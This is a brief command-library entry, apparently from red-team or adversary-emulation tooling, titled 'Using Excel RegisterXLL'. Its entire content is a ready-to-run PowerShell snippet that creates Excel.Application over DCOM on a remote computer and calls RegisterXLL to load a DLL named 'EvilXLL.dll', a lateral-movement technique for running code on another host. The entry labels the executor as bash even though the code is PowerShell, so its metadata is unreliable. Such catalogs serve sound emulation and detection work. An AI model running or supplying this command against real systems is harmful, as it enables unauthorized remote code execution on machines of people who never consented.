---
id: c98e733a-4c16-4a82-9ed9-2a17c63273ab
name: Using Excel RegisterXLL
type: command
executor: bash
data: '$excel = [activator]::CreateInstance([type]::GetTypeFromProgID(\"Excel.Application\",
  \"$ComputerName\"))

  $excel.RegisterXLL(\"EvilXLL.dll\")'
output: null
created_at: '2023-04-06T03:56:07.120684+00:00'
updated_at: '2023-04-10T20:26:32.005120+00:00'
---

# Using Excel RegisterXLL

```bash
$excel = [activator]::CreateInstance([type]::GetTypeFromProgID(\"Excel.Application\", \"$ComputerName\"))
$excel.RegisterXLL(\"EvilXLL.dll\")
```


